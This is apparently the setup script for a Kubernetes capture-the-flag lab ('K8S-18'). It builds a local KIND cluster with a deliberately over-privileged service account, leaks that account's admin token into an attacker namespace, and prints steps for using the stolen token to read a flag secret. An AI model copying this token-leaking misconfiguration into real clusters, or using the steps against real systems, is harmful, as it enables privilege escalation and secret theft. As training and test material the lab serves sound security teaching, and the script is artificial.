#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-18-sa-admin"

FLAG="${CVE_FLAG:-flag{k8s-18-default}}"

echo "[K8S-18] Service Account Token with Cluster-Admin"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Create namespace for the privileged service account
kubectl create namespace ns-admin 2>/dev/null || true
# Create namespace for the attacker
kubectl create namespace ns-ops 2>/dev/null || true

# Create ServiceAccount with cluster-admin privileges
kubectl create serviceaccount cluster-admin-sa -n ns-admin 2>/dev/null || true
kubectl create clusterrolebinding ca-full-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=ns-admin:cluster-admin-sa 2>/dev/null || true

# Store the flag as a Secret in a different namespace (needs cluster-admin to read)
kubectl create secret generic flag-secret \
  --namespace=ns-admin \
  --from-literal=flag="$FLAG" 2>/dev/null || \
  kubectl create secret generic flag-secret \
  --namespace=ns-admin \
  --from-literal=flag="$FLAG" --dry-run=client -o yaml | kubectl apply -f -

# Generate a token for the cluster-admin SA and leak it to the attacker namespace
TOKEN=$(kubectl create token cluster-admin-sa -n ns-admin --duration=24h 2>/dev/null || echo "token-unavailable")
kubectl create secret generic leaked-admin-token \
  --namespace=ns-ops \
  --from-literal=token="$TOKEN" 2>/dev/null || \
  kubectl create secret generic leaked-admin-token \
  --namespace=ns-ops \
  --from-literal=token="$TOKEN" --dry-run=client -o yaml | kubectl apply -f -

# Deploy attacker pod in ns-ops with the leaked token mounted
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: ns-ops
spec:
  containers:
    - name: kubectl
      image: bitnami/kubectl:1.27
      command: ["sleep", "3600"]
      volumeMounts:
        - name: leaked-token
          mountPath: /var/run/secrets/leaked
          readOnly: true
  volumes:
    - name: leaked-token
      secret:
        secretName: leaked-admin-token
YAML

# Also create a limited pod for the initial foothold
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: init-pod
  namespace: ns-ops
spec:
  containers:
    - name: alpine
      image: alpine:latest
      command: ["sleep", "3600"]
YAML

echo "[*] Waiting for pods to be ready..."
kubectl wait --for=condition=Ready pod/attacker-pod -n ns-ops --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/init-pod -n ns-ops --timeout=60s 2>/dev/null || true

echo ""
echo "[+] K8S-18 SA Cluster-Admin Ready"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. kubectl exec -it init-pod -n ns-ops -- sh"
echo "    2. Enumerate available secrets in ns-ops namespace"
echo "    3. Extract leaked token from leaked-admin-token secret"
echo "    4. kubectl --token=\$TOKEN --server=https://kubernetes.default.svc get secret flag-secret -n ns-admin"
echo "    5. Decode the flag: kubectl ... -o jsonpath='{.data.flag}' | base64 -d"
